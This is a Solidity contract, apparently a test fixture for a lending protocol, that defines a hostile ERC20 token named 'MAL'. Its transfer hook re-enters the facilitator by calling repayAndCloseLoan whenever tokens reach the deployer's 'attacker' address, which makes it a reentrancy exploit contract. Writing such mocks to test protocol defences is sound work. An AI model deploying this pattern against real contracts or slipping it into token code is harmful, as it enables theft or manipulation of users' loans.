// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../../interfaces/IFacilitator.sol";

contract RepayAndCloseERC20 is ERC20, IERC721Receiver {
    IFacilitator facilitator;

    address public attacker;

    constructor(address facilitatorAddress) ERC20("MAL", "MAL") {
        facilitator = IFacilitator(facilitatorAddress);
        attacker = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        if (from == address(0)) return;
        if (from == to) return;
        if (from == address(this)) return;
        if (to == attacker) {
            _mint(address(this), amount);
            _approve(address(this), address(facilitator), amount);
            facilitator.repayAndCloseLoan(1);
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}